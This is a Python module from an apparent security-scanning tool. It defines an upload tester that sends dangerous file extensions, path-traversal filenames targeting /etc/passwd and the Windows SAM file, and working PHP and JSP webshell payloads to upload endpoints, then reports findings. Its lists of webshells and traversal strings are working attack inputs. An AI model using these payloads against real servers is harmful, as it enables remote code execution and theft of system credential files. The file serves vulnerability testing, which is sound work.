"""Upload Tester — tests file upload endpoints for vulnerabilities."""

from __future__ import annotations

from typing import Any

from sentinel_v2.executors.base import BaseExecutor


class UploadTester(BaseExecutor):
    """Tests file upload endpoints for unrestricted file types, path traversal, and webshell upload."""

    # Dangerous file extensions
    DANGEROUS_EXTENSIONS = [
        ".php", ".php3", ".php4", ".php5", ".php7", ".phtml", ".pht",
        ".asp", ".aspx", ".asa", ".asax", ".ascx", ".ashx", ".asmx",
        ".jsp", ".jspx", ".jspa", ".jsw", ".jsv", ".jtml",
        ".exe", ".bat", ".cmd", ".com", ".msi", ".scr", ".pif",
        ".sh", ".bash", ".csh", ".ksh",
        ".py", ".pl", ".rb", ".cgi",
        ".html", ".htm", ".svg", ".xhtml",
    ]

    # Path traversal sequences
    TRAVERSAL_SEQUENCES = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
    ]

    # Webshell content
    WEBSHELL_PAYLOADS = [
        "<?php echo system($_GET['cmd']); ?>",
        "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
        "<%= Runtime.getRuntime().exec(request.getParameter(\"cmd\")) %>",
        "<?php eval($_POST['code']); ?>",
        "<?php shell_exec($_GET['cmd']); ?>",
    ]

    @property
    def name(self) -> str:
        return "upload_tester"

    @property
    def vuln_class(self) -> str:
        return "file_upload"

    @property
    def description(self) -> str:
        return "Tests file upload endpoints for unrestricted file types, path traversal, and webshell upload"

    async def test(self, endpoint: str, **kwargs) -> dict[str, Any]:
        findings = []
        evidence = []
        http = kwargs.get("http_client")
        headers = kwargs.get("headers", {})

        if not http:
            return {"findings": [], "evidence": [], "error": "No HTTP client"}

        # Test 1: Upload PHP file
        for ext in self.DANGEROUS_EXTENSIONS[:5]:
            filename = f"test{ext}"
            result = await self._test_upload(http, endpoint, filename, b"<?php phpinfo(); ?>", headers)
            evidence.append(result["evidence"])

            if result["vulnerable"]:
                findings.append(self._create_finding(
                    title=f"Unrestricted File Upload — {ext} files accepted",
                    severity="high",
                    endpoint=endpoint,
                    evidence=f"File {filename} was uploaded successfully. Server accepts {ext} files.",
                    steps=[
                        f"Create a file with {ext} extension",
                        f"Upload to {endpoint}",
                        "Verify file is accessible",
                        "Upload webshell for RCE",
                    ],
                    impact="Remote code execution via webshell upload",
                    confidence=0.85,
                ))

        # Test 2: Path traversal in filename
        for traversal in self.TRAVERSAL_SEQUENCES[:3]:
            result = await self._test_upload(http, endpoint, traversal, b"test", headers)
            evidence.append(result["evidence"])

            if result["vulnerable"]:
                findings.append(self._create_finding(
                    title=f"Path Traversal in Upload — filename not sanitized",
                    severity="critical",
                    endpoint=endpoint,
                    evidence=f"Filename {traversal} was accepted. Server does not sanitize filenames.",
                    steps=[
                        f"Upload file with filename: {traversal}",
                        "Verify file is written to parent directory",
                        "Write to sensitive locations like /etc/cron.d/",
                    ],
                    impact="Arbitrary file write, potential RCE",
                    confidence=0.9,
                ))

        # Test 3: Webshell content
        for payload in self.WEBSHELL_PAYLOADS[:2]:
            result = await self._test_upload(http, endpoint, "shell.php", payload.encode(), headers)
            evidence.append(result["evidence"])

            if result["vulnerable"]:
                findings.append(self._create_finding(
                    title=f"Webshell Upload — PHP code accepted in upload",
                    severity="critical",
                    endpoint=endpoint,
                    evidence=f"Webshell payload was uploaded. Server does not validate file content.",
                    steps=[
                        "Upload PHP webshell",
                        "Access uploaded file via web browser",
                        "Execute system commands via webshell",
                    ],
                    impact="Full server compromise",
                    confidence=0.95,
                ))

        return {
            "findings": [f.to_dict() for f in findings],
            "evidence": evidence,
            "tested_count": len(self.DANGEROUS_EXTENSIONS[:5]) + len(self.TRAVERSAL_SEQUENCES[:3]),
            "vulnerable": len(findings) > 0,
        }

    async def _test_upload(self, http, endpoint: str, filename: str,
                           content: bytes, headers: dict) -> dict:
        """Test uploading a file."""
        # Create multipart form data
        boundary = "----SentinelBoundary"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode() + content + f"\r\n--{boundary}--\r\n".encode()

        upload_headers = dict(headers)
        upload_headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"

        result = await http.request("POST", endpoint, headers=upload_headers, body=body)

        # Check if upload succeeded
        vulnerable = False
        if 200 <= result["status_code"] < 300:
            body_lower = result["body"].lower()
            success_indicators = ["uploaded", "success", "file", "saved", "stored"]
            if any(indicator in body_lower for indicator in success_indicators):
                vulnerable = True

        return {
            "vulnerable": vulnerable,
            "evidence": {
                "filename": filename,
                "status": result["status_code"],
                "length": len(result["body"]),
                "snippet": result["body"][:200],
            },
        }
